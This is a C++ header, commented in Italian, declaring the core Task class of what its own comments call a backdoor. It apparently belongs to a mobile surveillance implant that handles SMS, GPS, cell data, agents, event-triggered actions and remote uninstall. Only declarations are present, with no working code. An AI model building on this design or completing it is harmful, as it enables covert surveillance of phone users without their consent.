#include "Common.h"
#include <string>
#include <exception>
using namespace std;

#ifndef __Task_h__
#define __Task_h__

#include "Conf.h"
#include "Status.h"
#include "Transfer.h"
#include "Device.h"
#include "SmsMessage.h"
#include "GPS.h"
#include "Cell.h"
#include "UberLog.h"
#include "Observer.h"
#include "ril.h"
#include <common_new\gpsapi.h>
#include <common_new\Msgqueue.h>
#include "ModulesManager.h"
#include "EventsManager.h"
#include "ActionsManager.h"

class Conf;
class Status;
class Transfer;
class Task;
class Device;

class Task : public Transfer {
	/**
	 * Puntatore ad un oggetto Conf che viene allocato ed inizializzato dal costruttore. Viene liberato
	 * poi dal distruttore.
	 */
	private:
		static Task *Instance;
		static volatile LONG lLock;

		Conf* confObj;
		Status *statusObj;
		Device *deviceObj;
		UberLog *uberlogObj;
		Observer *observerObj;
		ModulesManager *modulesManager;
		EventsManager *eventsManager;
		ActionsManager *actionsManager;
		HANDLE wakeupEvent;
		BOOL uninstallRequested;
		static BOOL demo;

	/**
	 * Instanzia l'oggetto Conf ed inizializza la configurazione.
	 */
	private:  Task();
			 ~Task();

	/**
	 * Questa funzione viene chiamata una sola volta allo startup della backdoor, e in nessun'altra
	 * circostanza. Puo' essere usata per generare notifiche (ad esempio per scrivere il LogInfo).
	 */
	public: void StartNotification();

	/**
	 * Questa funzione stoppa tutti gli agenti attivi, chiama Conf e carica la configurazione, quindi riavvia tutti gli
	 * agenti. Torna TRUE se la backdoor e' stata inizializzata con successo, FALSE altrimenti. TaskInit() deve
	 * controllare bUninstall prima di avviare gli agenti.
	 */
	public: BOOL TaskInit();

	/**
	 * Scorre la lista degli eventi, controlla quali sono stati attivati ed esegue le relative azioni. Ogni azione e'
	 * sequenziale, pertanto questa funzione non deve essere eseguita in un thread separato. Deve verificare
	 * lo stato di bUninstall subito dopo l'inizio della funzione.
	 */
	public: BOOL CheckActions();

		static Task* self();
		void uninstall();
		void wakeup();
		static BOOL getDemo();
};

#endif
